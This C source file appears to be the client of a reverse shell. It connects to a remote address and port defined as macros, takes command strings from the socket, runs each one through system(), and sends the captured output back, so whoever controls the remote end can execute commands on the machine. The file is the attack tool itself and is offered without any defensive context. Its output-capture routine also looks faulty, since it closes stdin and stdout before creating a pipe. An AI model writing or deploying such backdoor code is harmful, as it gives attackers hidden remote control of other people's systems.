#include "header.h"
int shell(char *cmd)
{
	//it change the system() default output, and after capture it in stdin 
	int p[2],newp,ascii=0;
	newp = dup(1);
	close(0);
	close(1);
	pipe(p);
	system(cmd);
	dup2(newp,1);
	while(1)
	{
		output[ascii] = fgetc(stdin);
		if(output[ascii]=='\0'||output[ascii]==EOF)
		{
			break;
		}
		ascii++;
	}
	return 0;
}
int main(int argc,char *argv[])
{
	setlocale(LC_ALL,"");
	char buffer[300];
	struct sockaddr_in extern_struct;
	extern_struct.sin_family = AF_INET;
	extern_struct.sin_addr.s_addr = inet_addr(ADDRESS);
	extern_struct.sin_port = htons(atoi(PORT));
	memset(extern_struct.sin_zero,0,sizeof(extern_struct.sin_zero));
	if((inet_aton(ADDRESS,&extern_struct.sin_addr))==0)
	{
		printf("addr: crash! restart the program\n");
	}
	externfd = socket(AF_INET,SOCK_STREAM,0);
	if(externfd == -1)
	{
		printf("socket: crash! restart the program\n");
		exit(1);
	}
	if(connect(externfd,(struct sockaddr *) &extern_struct,sizeof(extern_struct))==-1)
	{
		printf("connect: crash! restart the program\n");
		exit(1);
	}
	printf("\n");
	while(1)
	{
		recv(externfd,buffer,sizeof(buffer),0);
		memset(output,0,sizeof(output));
		shell(buffer);
		send(externfd,output,sizeof(output),0);
		memset(output,0,sizeof(output));
	}
	close(externfd);
}
